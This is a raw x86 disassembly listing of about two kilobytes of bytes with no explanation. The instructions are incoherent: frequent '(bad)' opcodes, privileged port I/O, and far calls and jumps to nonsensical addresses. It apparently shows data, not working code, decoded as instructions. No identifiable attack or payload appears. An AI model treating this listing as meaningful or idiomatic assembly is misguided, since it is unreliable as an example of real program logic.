  40a920:	nop
  40a921:	aaa    
  40a922:	push   edi
  40a923:	ror    DWORD PTR [ebx],cl
  40a925:	popa   
  40a926:	repz jo 0x40a99b
  40a929:	and    bl,BYTE PTR [edi-0x28]
  40a92c:	call   0x1742:0x716c09ef
  40a933:	out    dx,al
  40a934:	sub    edx,DWORD PTR [edx+0x1de64f1f]
  40a93a:	fdiv   QWORD PTR [edx-0x49]
  40a93d:	fsubr  DWORD PTR [eax-0x26]
  40a940:	xchg   DWORD PTR [esp+eiz*2],ebp
  40a943:	popf   
  40a944:	iret   
  40a945:	test   BYTE PTR [ebx],bl
  40a947:	out    dx,eax
  40a948:	in     eax,dx
  40a949:	in     al,0xab
  40a94b:	fs aam 0x5
  40a94e:	aam    0xcc
  40a950:	sbb    DWORD PTR [ecx+0xe53814f],edx
  40a956:	cli    
  40a957:	(bad)  
  40a959:	sub    eax,0x433b59a7
  40a95e:	int3   
  40a95f:	adc    DWORD PTR [edx-0x3],ebx
  40a962:	sti    
  40a963:	ins    BYTE PTR es:[edi],dx
  40a964:	pop    edx
  40a965:	daa    
  40a966:	mov    dh,0xf6
  40a968:	cmp    DWORD PTR [ecx],edi
  40a96a:	pop    ss
  40a96b:	adc    BYTE PTR [edx+0x5c],0x1d
  40a96f:	sbb    eax,0x4efe090f
  40a974:	js     0x40a942
  40a976:	push   edi
  40a977:	push   esp
  40a978:	add    eax,0x5df473fb
  40a97d:	cmp    cl,dl
  40a97f:	ins    DWORD PTR es:[edi],dx
  40a980:	imul   edx,ebp,0x64
  40a983:	mov    ebx,0xab5efd23
  40a988:	cwde   
  40a989:	mov    bh,0xe3
  40a98b:	sbb    BYTE PTR [eax-0x3b9c5cd2],bh
  40a991:	lock cmp eax,edi
  40a994:	pop    ebx
  40a995:	scas   eax,DWORD PTR es:[di]
  40a997:	pop    edi
  40a998:	mov    edi,0xa67999df
  40a99d:	cmp    eax,0x5ef9b03f
  40a9a2:	jge    0x40a9c2
  40a9a4:	jno    0x40aa00
  40a9a6:	sbb    BYTE PTR [ebx],ch
  40a9a8:	jmp    0x9ec8d7a3
  40a9ad:	pushw  ss
  40a9af:	aad    0x2
  40a9b1:	xor    eax,DWORD PTR [edi+0x13]
  40a9b4:	push   ss
  40a9b5:	loop   0x40aa10
  40a9b7:	jecxz  0x40a9b7
  40a9b9:	inc    edi
  40a9ba:	add    eax,0xd08ea167
  40a9bf:	ficom  WORD PTR [ebx-0x3b7c6085]
  40a9c5:	sbb    ebx,edx
  40a9c7:	loop   0x40a9b3
  40a9c9:	fild   WORD PTR [esi]
  40a9cb:	mov    ebp,0x54c1c5a3
  40a9d0:	es inc edx
  40a9d2:	add    al,0x33
  40a9d4:	push   eax
  40a9d5:	test   BYTE PTR [ebp-0x4743e045],0xa9
  40a9dc:	retf   0xa12c
  40a9df:	or     DWORD PTR ds:0xcb5321d,edi
  40a9e5:	pop    esi
  40a9e6:	pop    ecx
  40a9e7:	jno    0x40a9dc
  40a9e9:	ror    DWORD PTR [edx+0x5d],1
  40a9ec:	or     DWORD PTR fs:[ebx],ebx
  40a9ef:	dec    eax
  40a9f0:	xchg   edx,eax
  40a9f1:	mov    cl,0x23
  40a9f3:	imul   ebx,DWORD PTR [esi+ebp*4-0x414be036],0xffffff99
  40a9fb:	in     al,dx
  40a9fc:	aas    
  40a9fd:	ja     0x40aa69
  40a9ff:	mov    eax,0x1aa7279c
  40aa04:	fs jl  0x40aa6b
  40aa07:	ficomp WORD PTR [ebp-0x56ff3fa7]
  40aa0d:	adc    eax,0xd7c7f337
  40aa12:	loope  0x40a9ef
  40aa14:	sub    BYTE PTR [ebx],0x4e
  40aa17:	xchg   ecx,eax
  40aa18:	adc    ecx,DWORD PTR [ebp+0x38662d2a]
  40aa1e:	mov    al,0x0
  40aa20:	cmc    
  40aa21:	mov    ah,0x42
  40aa23:	stos   BYTE PTR es:[edi],al
  40aa24:	adc    eax,DWORD PTR [eax-0x35]
  40aa27:	out    dx,al
  40aa28:	and    eax,0x1fe0e14a
  40aa2d:	daa    
  40aa2e:	jle    0x40aa49
  40aa30:	inc    ecx
  40aa31:	loope  0x40aa29
  40aa33:	cmp    al,0x9b
  40aa35:	mov    eax,0xde498135
  40aa3a:	icebp  
  40aa3b:	lods   al,BYTE PTR ds:[esi]
  40aa3c:	mov    esp,?
  40aa3e:	stc    
  40aa3f:	ret    
  40aa40:	inc    esp
  40aa41:	sti    
  40aa42:	jbe    0x40aa4f
  40aa44:	mov    edx,0x52598d34
  40aa49:	xchg   DWORD PTR [ebx-0x34a53be8],ebp
  40aa4f:	mov    WORD PTR [eax-0x3dbdc595],es
  40aa55:	jg     0x40aa80
  40aa57:	mov    eax,0x68a46d41
  40aa5c:	jo     0x40aab0
  40aa5e:	call   0xedf3:0x2736847a
  40aa65:	or     BYTE PTR [ecx-0x34a91246],cl
  40aa6b:	mov    eax,ds:0x2c69ddcc
  40aa70:	in     eax,0xb8
  40aa72:	test   al,0x6c
  40aa74:	ins    BYTE PTR es:[edi],dx
  40aa75:	sbb    cl,ch
  40aa77:	shr    DWORD PTR [edi],0xa7
  40aa7a:	lahf   
  40aa7b:	(bad)  
  40aa7c:	xor    BYTE PTR [ebx],ch
  40aa7e:	or     bl,BYTE PTR [ebx]
  40aa80:	dec    ecx
  40aa81:	sub    dl,bh
  40aa83:	popa   
  40aa84:	mov    ecx,0x7c8ddb24
  40aa89:	mov    dh,0x1e
  40aa8b:	inc    esp
  40aa8c:	dec    ebx
  40aa8d:	jb     0x40aac1
  40aa8f:	out    0xb8,eax
  40aa91:	mov    es,WORD PTR [edx+eax*1+0x69]
  40aa95:	fwait
  40aa96:	dec    esp
  40aa97:	xlat   BYTE PTR ds:[ebx]
  40aa98:	push   esp
  40aa99:	mov    al,ah
  40aa9b:	bound  edi,QWORD PTR [ebp-0xf]
  40aa9e:	data16 sub al,0x2f
  40aaa1:	and    eax,0x8fc57203
  40aaa6:	and    ebx,edi
  40aaa8:	and    al,0x8d
  40aaaa:	in     eax,0x76
  40aaac:	cmp    DWORD PTR [edi-0x54],ecx
  40aaaf:	into   
  40aab0:	scas   eax,DWORD PTR es:[edi]
  40aab1:	outs   dx,BYTE PTR ds:[esi]
  40aab2:	pmaxub mm3,mm5
  40aab5:	add    edi,DWORD PTR [ecx-0x7e]
  40aab8:	adc    esi,DWORD PTR [ecx+eax*4-0x71135fd8]
  40aabf:	jge    0x40aafe
  40aac1:	mov    dl,0x1
  40aac3:	cmp    eax,0xee6caa1d
  40aac8:	addr16 loope 0x40aa7e
  40aacb:	inc    edi
  40aacc:	or     DWORD PTR [edx+eax*2+0x25],esp
  40aad0:	push   ss
  40aad1:	or     DWORD PTR [edx+0x3e874d5e],edi
  40aad7:	jmp    ecx
  40aad9:	sti    
  40aada:	xor    ah,BYTE PTR [ebp+0x47e050f7]
  40aae0:	mov    WORD PTR [edx],cs
  40aae2:	aas    
  40aae3:	rcr    esp,cl
  40aae5:	push   cs
  40aae6:	jg     0x40aac6
  40aae8:	inc    eax
  40aae9:	and    ah,ch
  40aaeb:	fild   QWORD PTR [eax]
  40aaed:	aaa    
  40aaee:	mov    bh,0x95
  40aaf0:	shl    DWORD PTR [ecx-0x2c9a5ca],1
  40aaf6:	aaa    
  40aaf7:	or     DWORD PTR [edi-0x37],0x9b85d3b8
  40aafe:	lods   eax,DWORD PTR ds:[esi]
  40aaff:	pushf  
  40ab00:	pushf  
  40ab01:	jmp    0xf553:0x56559c34
  40ab08:	mov    bl,0x38
  40ab0a:	pop    esi
  40ab0b:	inc    ecx
  40ab0c:	mov    edi,0xc4214f39
  40ab11:	xor    BYTE PTR [ecx-0x63f32271],ah
  40ab17:	pop    esp
  40ab18:	inc    ebp
  40ab19:	stos   BYTE PTR es:[edi],al
  40ab1a:	test   BYTE PTR [edi],bl
  40ab1c:	fbld   TBYTE PTR [ebx+0x50]
  40ab1f:	dec    eax
  40ab20:	mov    ebp,0xeea61978
  40ab25:	xor    esi,DWORD PTR [edx+0x6ff577e2]
  40ab2b:	cmp    bh,ch
  40ab2d:	mov    DWORD PTR [esi+edi*1+0x5b1f9050],ebx
  40ab34:	xchg   edi,eax
  40ab35:	mov    edx,0xec8fb4ac
  40ab3a:	imul   ecx,DWORD PTR [ecx-0x32dfd78a],0xffffff96
  40ab41:	mov    ds:0xd2b94370,al
  40ab46:	mov    ebp,0x39eac53d
  40ab4b:	ret    0x3fee
  40ab4e:	mov    ds:0x6c5e99e0,eax
  40ab53:	dec    esi
  40ab54:	pushf  
  40ab55:	cdq    
  40ab56:	mov    ecx,0xc2592d9c
  40ab5b:	ins    DWORD PTR es:[edi],dx
  40ab5c:	into   
  40ab5d:	scas   eax,DWORD PTR es:[edi]
  40ab5e:	test   al,0x35
  40ab60:	jnp    0x40ab2e
  40ab62:	ror    dl,cl
  40ab64:	sbb    bh,BYTE PTR [edi-0x11]
  40ab67:	adc    BYTE PTR [ebp+0x4b],dl
  40ab6a:	les    ebx,FWORD PTR [esp+esi*1]
  40ab6d:	scas   eax,DWORD PTR es:[edi]
  40ab6e:	mov    al,BYTE PTR [esi-0x5bbfca67]
  40ab74:	mov    edx,0xfabca78a
  40ab79:	enter  0xa264,0x3a
  40ab7d:	mov    bl,0xbc
  40ab7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab80:	cmp    ebx,DWORD PTR [edx+0x6cf7262a]
  40ab86:	ja     0x40abe5
  40ab88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab89:	adc    BYTE PTR [ebp+0x73],al
  40ab8c:	mov    ebx,0x64214278
  40ab91:	adc    esp,ebp
  40ab93:	sbb    eax,0xc74d55fd
  40ab98:	test   edx,esi
  40ab9a:	jne    0x40abfe
  40ab9c:	mov    al,0x24
  40ab9e:	add    ebx,ecx
  40aba0:	dec    ebx
  40aba1:	ins    BYTE PTR es:[edi],dx
  40aba2:	ficomp WORD PTR [ebp+0x7]
  40aba5:	call   0xd676:0xf217fcb6
  40abac:	fs pop eax
  40abae:	das    
  40abaf:	(bad)  
  40abb0:	fldcw  WORD PTR [ecx+0x7f]
  40abb3:	ja     0x40ac1d
  40abb5:	sbb    BYTE PTR [edx-0x5c447d1f],0x44
  40abbc:	xlat   BYTE PTR ds:[ebx]
  40abbd:	ss pushf 
  40abbf:	or     eax,esp
  40abc1:	pop    ds
  40abc2:	mov    ah,BYTE PTR [edx-0x51]
  40abc5:	mov    esi,0x8bd9f465
  40abca:	add    al,0xfd
  40abcc:	arpl   si,sp
  40abce:	push   es
  40abcf:	dec    eax
  40abd0:	retf   0x2580
  40abd3:	xor    DWORD PTR [ebx],esi
  40abd5:	mov    ah,0x3b
  40abd7:	adc    bl,cl
  40abd9:	pop    ds
  40abda:	xchg   DWORD PTR [ecx-0x7e],eax
  40abdd:	inc    ebx
  40abde:	add    edx,ebp
  40abe0:	fidivr WORD PTR [edi-0x7cc97f7b]
  40abe6:	cmp    ah,bl
  40abe8:	popa   
  40abe9:	popf   
  40abea:	cmp    al,0x24
  40abec:	fnstenv [edi]
  40abee:	js     0x40ab9d
  40abf0:	inc    edx
  40abf1:	jne    0x40ab9b
  40abf3:	shl    DWORD PTR [ecx+ebp*1-0x6e],1
  40abf7:	inc    ecx
  40abf8:	add    bl,cl
  40abfa:	mov    esi,0x51f21785
  40abff:	mov    ebp,0x8b601b6d
  40ac04:	das    
  40ac05:	inc    esp
  40ac06:	and    ch,ch
  40ac08:	icebp  
  40ac09:	cmp    dh,BYTE PTR [edx-0x1a0f188e]
  40ac0f:	and    eax,0x4f045987
  40ac14:	pop    DWORD PTR ss:[ecx]
  40ac17:	mov    esi,0x6d6108e3
  40ac1c:	lea    esp,[ebx-0x3a2fa09f]
  40ac22:	xor    bl,cl
  40ac24:	fwait
  40ac25:	cs jl  0x40abdb
  40ac28:	outs   dx,BYTE PTR ds:[esi]
  40ac29:	nop
  40ac2a:	(bad)  
  40ac2b:	sub    eax,0x5c03f876
  40ac30:	lds    edx,FWORD PTR [ecx+0x70]
  40ac33:	(bad)  
  40ac34:	jns    0x40ac41
  40ac36:	jmp    0x9a90d4cf
  40ac3b:	in     eax,dx
  40ac3c:	adc    BYTE PTR [esi],dl
  40ac3e:	imul   BYTE PTR [edx-0x7f]
  40ac41:	int3   
  40ac42:	mov    ebp,0x7fe4ba6b
  40ac47:	pop    esp
  40ac48:	lds    esp,FWORD PTR [ecx-0x32]
  40ac4b:	inc    ebp
  40ac4c:	mov    esp,0x27389c0c
  40ac51:	lock int 0x6
  40ac54:	or     dh,BYTE PTR [esi-0x24]
  40ac57:	ins    DWORD PTR es:[edi],dx
  40ac58:	lds    esi,FWORD PTR [edx]
  40ac5a:	add    ah,0x28
  40ac5d:	sar    DWORD PTR [ecx],0xbf
  40ac60:	or     ebx,ebp
  40ac62:	push   0x4cea4d06
  40ac67:	rol    BYTE PTR [ebp+0x12],0x64
  40ac6b:	fninit 
  40ac6d:	push   ebx
  40ac6e:	pop    ss
  40ac6f:	in     al,0x59
  40ac71:	inc    esp
  40ac72:	mov    eax,0x66981ee8
  40ac77:	dec    eax
  40ac78:	adc    esp,ebp
  40ac7a:	adc    cl,BYTE PTR [ebx]
  40ac7c:	minps  xmm7,XMMWORD PTR [eax]
  40ac7f:	mov    ds:0x24dea06f,al
  40ac84:	mov    cl,BYTE PTR [ebx+0x5e]
  40ac87:	sub    al,0x9d
  40ac89:	icebp  
  40ac8a:	mov    bl,0x24
  40ac8c:	test   DWORD PTR [edi+0x2],esp
  40ac8f:	mov    ax,ds:0x219b747e
  40ac95:	push   edx
  40ac96:	push   edx
  40ac97:	scas   eax,DWORD PTR es:[edi]
  40ac98:	mov    dh,0xba
  40ac9a:	dec    eax
  40ac9b:	or     al,0x63
  40ac9d:	pop    esi
  40ac9e:	sub    DWORD PTR [eax+0x1a364645],0x124e7baa
  40aca8:	cmp    BYTE PTR [eax+ecx*8+0x6287fd99],dl
  40acaf:	test   al,0xe4
  40acb1:	in     eax,dx
  40acb2:	addr16 retf 
  40acb4:	pushf  
  40acb5:	pop    edi
  40acb6:	add    DWORD PTR [ebx],ebp
  40acb8:	mov    ds:0xce755d92,al
  40acbd:	aam    0x13
  40acbf:	push   edi
  40acc0:	loopne 0x40ad1f
  40acc2:	(bad)  
  40acc4:	mov    al,ds:0x995a41c5
  40acc9:	inc    esi
  40acca:	dec    ebp
  40accb:	and    ebx,DWORD PTR [ebx+edx*8+0x2032467c]
  40acd2:	int3   
  40acd3:	scas   al,BYTE PTR es:[edi]
  40acd4:	bound  esi,QWORD PTR [esp+ebp*2+0x25acc8be]
  40acdb:	and    dl,dh
  40acdd:	lea    ecx,cs:[esi+0x58065435]
  40ace4:	inc    eax
  40ace5:	add    DWORD PTR [ebp+0x3e35c450],edi
  40aceb:	loope  0x40ad47
  40aced:	jb     0x40ac7c
  40acef:	sub    DWORD PTR [edi-0xf76e6a1],esp
  40acf5:	out    0x59,al
  40acf7:	sbb    cl,BYTE PTR [ecx-0x3c0603e2]
  40acfd:	inc    esp
  40acfe:	jl     0x40acc0
  40ad00:	in     al,dx
  40ad01:	adc    BYTE PTR [ecx+0x1e206983],al
  40ad07:	and    bl,bl
  40ad09:	imul   esi,DWORD PTR [ecx],0xfb602b9d
  40ad0f:	das    
  40ad10:	fs ret 0xf4e5
  40ad14:	js     0x40acfe
  40ad16:	shr    BYTE PTR [ebx+0x52],1
  40ad19:	iret   
  40ad1a:	daa    
  40ad1b:	pop    ebx
  40ad1c:	inc    ecx
  40ad1d:	dec    eax
  40ad1e:	add    bl,bh
  40ad20:	xchg   ecx,eax
  40ad21:	inc    edx
  40ad22:	rcl    DWORD PTR [eax+0x10092693],0x23
  40ad29:	cmp    eax,0x8f0d5f04
  40ad2e:	cmp    bh,ah
  40ad30:	sub    BYTE PTR [esi-0x2b1a93bf],bh
  40ad36:	pop    ecx
  40ad37:	lods   al,BYTE PTR ds:[esi]
  40ad38:	in     eax,0x92
  40ad3a:	add    eax,0x130efd5e
  40ad3f:	jo     0x40ad56
  40ad41:	int    0x77
  40ad43:	stc    
  40ad44:	ficomp WORD PTR [esp+ecx*2+0x369517d3]
  40ad4b:	sub    DWORD PTR [edi+ebp*1],ebp
  40ad4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad4f:	cs push edx
  40ad51:	and    bl,BYTE PTR [ecx+0x235272fb]
  40ad57:	mov    esi,0x547d5db9
  40ad5c:	aad    0x8d
  40ad5e:	pop    ss
  40ad5f:	adc    al,0x52
  40ad61:	js     0x40adb1
  40ad63:	fwait
  40ad64:	leave  
  40ad65:	retf   
  40ad66:	enter  0xf121,0xb7
  40ad6a:	sub    al,0x7d
  40ad6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad6d:	test   eax,0xf8d96651
  40ad72:	pop    ds
  40ad73:	mov    dl,0x62
  40ad75:	xchg   ebx,eax
  40ad76:	fmul   QWORD PTR [edi]
  40ad78:	loop   0x40adb6
  40ad7a:	pop    edx
  40ad7b:	fs repnz scas eax,DWORD PTR es:[edi]
  40ad7e:	lods   eax,DWORD PTR ds:[esi]
  40ad7f:	jge    0x40ad27
  40ad81:	popf   
  40ad82:	inc    edi
  40ad83:	cmp    cl,0xf5
  40ad86:	scas   al,BYTE PTR es:[edi]
  40ad87:	call   0xf11:0x5f7e49ba
  40ad8e:	sub    DWORD PTR [ebx+eiz*4+0x24f757a8],ebp
  40ad95:	lock icebp 
  40ad97:	add    BYTE PTR [edi+0x76],dl
  40ad9a:	(bad)  
  40ad9b:	iret   
  40ad9c:	dec    ecx
  40ad9d:	out    dx,eax
  40ad9e:	dec    ebp
  40ad9f:	test   bl,ch
  40ada1:	jb     0x40adfa
  40ada3:	sub    al,BYTE PTR [eax-0x4aabbe1f]
  40ada9:	clc    
  40adaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40adab:	mov    esi,0xdf268ec0
  40adb0:	test   eax,0x9b5d266b
  40adb5:	mov    ah,bh
  40adb7:	jns    0x40adb0
  40adb9:	fcompp 
  40adbb:	loop   0x40adc9
  40adbd:	mov    WORD PTR [ebx-0x5],?
  40adc0:	(bad)  
  40adc1:	aad    0x20
  40adc3:	mov    ds:0x164e24fe,al
  40adc8:	or     DWORD PTR [ebx+0x46a3477],ebx
  40adce:	hlt    
  40adcf:	mov    bx,0xa910
  40add3:	add    al,0x6d
  40add5:	push   ecx
  40add6:	ins    DWORD PTR es:[edi],dx
  40add7:	push   eax
  40add8:	xor    al,0xaa
  40adda:	int3   
  40addb:	and    BYTE PTR [ebx-0xc8bd8be],0x7b
  40ade2:	imul   ecx,DWORD PTR ds:0x187d90e3,0x16a07c1f
  40adec:	mov    ah,0xe0
  40adee:	mov    dh,0xc0
  40adf0:	fidiv  DWORD PTR [edi-0x2c]
  40adf3:	cdq    
  40adf4:	into   
  40adf5:	sub    bh,BYTE PTR [edx-0x4e]
  40adf8:	adc    bl,BYTE PTR [ebx]
  40adfa:	aam    0x6f
  40adfc:	pop    ecx
  40adfd:	(bad)  
  40adfe:	mov    ds:0xb30d0c86,eax
  40ae03:	ja     0x40ae0c
  40ae05:	daa    
  40ae06:	dec    eax
  40ae07:	sub    DWORD PTR [eax],ebx
  40ae09:	and    eax,0x11206cab
  40ae0e:	loopne 0x40aded
  40ae10:	cld    
  40ae11:	adc    ecx,esp
  40ae13:	inc    esi
  40ae14:	dec    edx
  40ae15:	call   0x6566:0xb7fb79d2
  40ae1c:	or     DWORD PTR [edi-0x1b],esi
  40ae1f:	push   0x18
  40ae21:	mov    cl,0x7c
  40ae23:	cmp    DWORD PTR [ecx-0x20ba346a],ebp
  40ae29:	lods   eax,DWORD PTR ds:[esi]
  40ae2a:	mov    BYTE PTR [eax-0x64ccd2fa],dh
  40ae30:	test   BYTE PTR [eax+0x2],0x1c
  40ae34:	out    0x50,al
  40ae36:	cmp    dl,BYTE PTR [eax+0x5ded7a7a]
  40ae3c:	retf   
  40ae3d:	add    ah,BYTE PTR [esi+0x55]
  40ae40:	mov    BYTE PTR [edx+0x6a],al
  40ae43:	clc    
  40ae44:	nop
  40ae45:	pop    edx
  40ae46:	ror    cl,1
  40ae48:	bound  esi,QWORD PTR [edi]
  40ae4a:	imul   esi,DWORD PTR [eax-0x35],0xfffffff1
  40ae4e:	xor    al,0x7d
  40ae50:	in     eax,dx
  40ae51:	(bad)  
  40ae52:	outs   dx,DWORD PTR ds:[esi]
  40ae53:	fnstsw WORD PTR [eax]
  40ae55:	(bad)  
  40ae56:	arpl   WORD PTR [ecx-0x46052fc9],dx
  40ae5c:	push   0x9ae9ec6b
  40ae61:	adc    DWORD PTR [ebx-0x14],ebp
  40ae64:	and    BYTE PTR [edi+0x72fa406c],ch
  40ae6a:	mov    eax,ds:0xed5cef1
  40ae6f:	sahf   
  40ae70:	mov    esp,DWORD PTR [eax]
  40ae72:	lods   al,BYTE PTR ds:[esi]
  40ae73:	mov    ebp,0x5b6b00cf
  40ae78:	adc    BYTE PTR [esi+0x308f3bf9],cl
  40ae7e:	xchg   edi,eax
  40ae7f:	std    
  40ae80:	(bad)  
  40ae82:	sub    cl,dh
  40ae84:	sbb    eax,0x30225b6a
  40ae89:	dec    esp
  40ae8a:	arpl   WORD PTR [ecx],si
  40ae8c:	xor    DWORD PTR [ebx+0x3398a5bc],edi
  40ae92:	in     eax,dx
  40ae93:	cmc    
  40ae94:	jecxz  0x40ae55
  40ae96:	sbb    eax,DWORD PTR [ebx+0x64d8a1b6]
  40ae9c:	mov    BYTE PTR [ecx-0xa],ah
  40ae9f:	jns    0x40ae89
  40aea1:	test   DWORD PTR [edx+ebx*8],esi
  40aea4:	sub    eax,0xe441e5c3
  40aea9:	outs   dx,BYTE PTR ds:[esi]
  40aeaa:	sub    al,0xe3
  40aeac:	fcomp  QWORD PTR [esi+0x5c2d846e]
  40aeb2:	xor    eax,0x7696b6d9
  40aeb7:	xlat   BYTE PTR ds:[ebx]
  40aeb8:	pop    edi
  40aeb9:	fnstsw WORD PTR [ecx]
  40aebb:	dec    esp
  40aebc:	xor    dl,BYTE PTR es:[edx+0x3812bba0]
  40aec3:	push   ecx
  40aec4:	lods   al,BYTE PTR ds:[esi]
  40aec5:	out    dx,al
  40aec6:	repnz fxrstor [edi-0x7e3bb353]
  40aece:	loop   0x40aec4
  40aed0:	xchg   DWORD PTR [ecx-0x68],ebp
  40aed3:	jae    0x40af37
  40aed5:	push   cs
  40aed6:	test   eax,0x83f85b40
  40aedb:	cli    
  40aedc:	mov    DWORD PTR [edx],esp
  40aede:	(bad)  
  40aedf:	dec    eax
  40aee0:	int3   
  40aee1:	xchg   dh,al
  40aee3:	not    BYTE PTR [eax-0x30b3b043]
  40aee9:	push   0xcb4224dd
  40aeee:	(bad)  
  40aeef:	(bad)  
  40aef0:	cs sbb al,0x74
  40aef3:	lahf   
  40aef4:	js     0x40af21
  40aef6:	add    al,0xc5
  40aef8:	cmp    eax,ebx
  40aefa:	ds test edi,ebp
  40aefd:	ins    BYTE PTR es:[edi],dx
  40aefe:	mov    ds:0x5f72a9d6,eax
  40af03:	adc    bl,dl
  40af05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af06:	add    ch,ah
  40af08:	into   
  40af09:	rcr    BYTE PTR cs:[eax+0x4a0c1d8c],cl
  40af10:	shl    DWORD PTR [ebx],1
  40af12:	fcom   QWORD PTR [eax+0x66]
  40af15:	imul   edx,DWORD PTR [ebp-0x1e],0x9
  40af19:	jg     0x40aecd
  40af1b:	stos   DWORD PTR es:[edi],eax
  40af1c:	sbb    eax,0xd5adcd3a
  40af21:	push   es
  40af22:	(bad)  [ebx-0x30]
  40af25:	push   ebp
  40af26:	je     0x40aee6
  40af28:	pop    esi
  40af29:	push   ebx
  40af2a:	sbb    dh,BYTE PTR [edx]
  40af2c:	ds mov ebx,0xa138f50d
  40af32:	pop    esp
  40af33:	call   0x1031f14
  40af38:	je     0x40af7b
  40af3a:	sub    eax,0xc87e3177
  40af3f:	sbb    eax,eax
  40af41:	cmp    eax,0x175a48f3
  40af46:	mov    dh,bh
  40af48:	fnstcw WORD PTR [eiz*8+0x788a4e3f]
  40af4f:	xchg   esp,eax
  40af51:	mov    DWORD PTR [eax-0x3a],eax
  40af54:	in     eax,dx
  40af55:	xchg   edx,eax
  40af56:	and    dl,BYTE PTR [ebx]
  40af58:	pop    ecx
  40af59:	and    edx,ebx
  40af5b:	mov    ds:0xdaed1d64,eax
  40af60:	xor    eax,0x75262a98
  40af65:	inc    esp
  40af66:	fst    DWORD PTR [edi]
  40af68:	test   BYTE PTR [edi],ch
  40af6a:	in     al,dx
  40af6b:	fild   WORD PTR [eax-0x1c8568ae]
  40af71:	or     esi,DWORD PTR [ecx-0x4f]
  40af74:	dec    ebp
  40af75:	je     0x40af0b
  40af77:	ja     0x40afdb
  40af79:	jmp    0x870ba016
  40af7e:	cmp    ah,ch
  40af80:	push   es
  40af81:	ins    DWORD PTR es:[edi],dx
  40af82:	push   ebx
  40af83:	adc    cl,bh
  40af85:	test   dh,0xa7
  40af88:	nop
  40af89:	sbb    al,cl
  40af8b:	or     BYTE PTR [edx+0x37],al
  40af8e:	fbstp  TBYTE PTR [edx]
  40af90:	xor    bh,BYTE PTR [edx]
  40af92:	ss push cs
  40af94:	add    bh,ch
  40af96:	test   DWORD PTR [esi+0x6c],ecx
  40af99:	ss inc ecx
  40af9b:	or     DWORD PTR [edi+ebx*4-0x45],edi
  40af9f:	or     eax,0xc118226f
  40afa4:	sbb    ch,ch
  40afa6:	jmp    0x65e:0x63f64a50
  40afad:	ins    DWORD PTR es:[edi],dx
  40afae:	bound  ebx,QWORD PTR [eax]
  40afb0:	mov    dh,0xcc
  40afb2:	sub    DWORD PTR [esi-0x36],0x98f98e9a
  40afb9:	fiadd  WORD PTR [ebp+0x5ae13be9]
  40afbf:	clc    
  40afc0:	loope  0x40af8e
  40afc2:	xchg   esp,eax
  40afc3:	daa    
  40afc4:	xchg   ebp,eax
  40afc5:	and    edi,edx
  40afc7:	loope  0x40b021
  40afc9:	xchg   BYTE PTR [edx],al
  40afcb:	std    
  40afcc:	xor    bh,BYTE PTR [edx+0x6c]
  40afcf:	jp     0x40afca
  40afd1:	sbb    eax,0x2b3bce2d
  40afd6:	arpl   WORD PTR [eax+0x2a0d86ea],bp
  40afdc:	jecxz  0x40af78
  40afde:	(bad)  
  40afdf:	jmp    0xa2860a1
  40afe4:	addr16 jns 0x40af86
  40afe7:	inc    edi
  40afe8:	jae    0x40b038
  40afea:	cmp    eax,0xcabcf408
  40afef:	xchg   ebx,eax
  40aff0:	daa    
  40aff1:	cmp    edi,edi
  40aff3:	sub    esp,ebx
  40aff5:	call   0x435ca211
  40affa:	add    eax,0xa8fced2c
  40afff:	mov    cl,0x5d
  40b001:	cmp    dh,BYTE PTR [edi-0x23]
  40b004:	das    
  40b005:	or     dh,BYTE PTR [ecx]
  40b007:	dec    ebp
  40b008:	inc    ecx
  40b009:	test   al,0x8b
  40b00b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b00c:	mov    esp,0xf61358dc
  40b011:	push   0x60ee2a4c
  40b016:	loop   0x40b08b
  40b018:	add    al,0xca
  40b01a:	adc    DWORD PTR [edi+ebp*1+0x29],esi
  40b01e:	retf   0x9f09
  40b021:	int    0x9
  40b023:	jecxz  0x40b029
  40b025:	jp     0x40aff1
  40b027:	sub    DWORD PTR [ecx-0x4d],ecx
  40b02a:	dec    esi
  40b02b:	dec    esp
  40b02c:	fcomp  QWORD PTR [edx]
  40b02e:	fild   QWORD PTR [ebx+0x79]
  40b031:	push   eax
  40b032:	adc    al,0xcd
  40b034:	jp     0x40afbc
  40b036:	mov    ds:0x9555d1dd,eax
  40b03b:	or     eax,esp
  40b03d:	mov    WORD PTR [ebx+0x1],ss
  40b040:	sbb    al,0xa2
  40b042:	mov    esp,esp
  40b044:	pop    es
  40b045:	outs   dx,DWORD PTR ds:[esi]
  40b046:	into   
  40b047:	je     0x40b099
  40b049:	add    DWORD PTR [esp+ecx*1-0x52],0xdeea5663
  40b051:	push   0xeec7f368
  40b056:	adc    al,0x59
  40b058:	cmp    ecx,DWORD PTR [edx]
  40b05a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b05b:	mov    ch,0x62
  40b05d:	cmp    al,0xa9
  40b05f:	fs mov fs,esp
  40b062:	or     esi,ebp
  40b064:	lea    edx,[eax+0x7ca34cde]
  40b06a:	xor    al,0x43
  40b06c:	leave  
  40b06d:	ret    
  40b06e:	or     esi,DWORD PTR [ebx-0x2674734b]
  40b074:	or     al,0x81
  40b076:	pop    ebx
  40b077:	div    DWORD PTR [ecx+0x31]
  40b07a:	mov    cl,0x10
  40b07c:	mov    al,ds:0x646af4a
  40b081:	dec    ebx
  40b082:	sbb    DWORD PTR [eax+0x622c6f6f],eax
  40b088:	jne    0x40b047
  40b08a:	mov    eax,ds:0xa7f78cee
  40b08f:	inc    edi
  40b090:	mov    ebx,ecx
  40b092:	in     eax,0x24
  40b094:	ins    DWORD PTR es:[edi],dx
  40b095:	sub    eax,esp
  40b097:	aad    0x8c
  40b099:	arpl   WORD PTR [eax],bx
  40b09b:	push   esp
  40b09c:	adc    bh,BYTE PTR [esi+0x6293df14]
  40b0a2:	dec    esp
  40b0a3:	and    ebx,esp
  40b0a5:	cs ret 0x2a5a
  40b0a9:	ret    
  40b0aa:	pop    esp
  40b0ab:	cmp    DWORD PTR [ebx+0xf],edx
  40b0ae:	ins    BYTE PTR es:[edi],dx
  40b0af:	nop
  40b0b0:	adc    ebx,DWORD PTR [ebp+0x186c4a9b]
  40b0b6:	jle    0x40b093
  40b0b8:	int3   
  40b0b9:	pop    esp
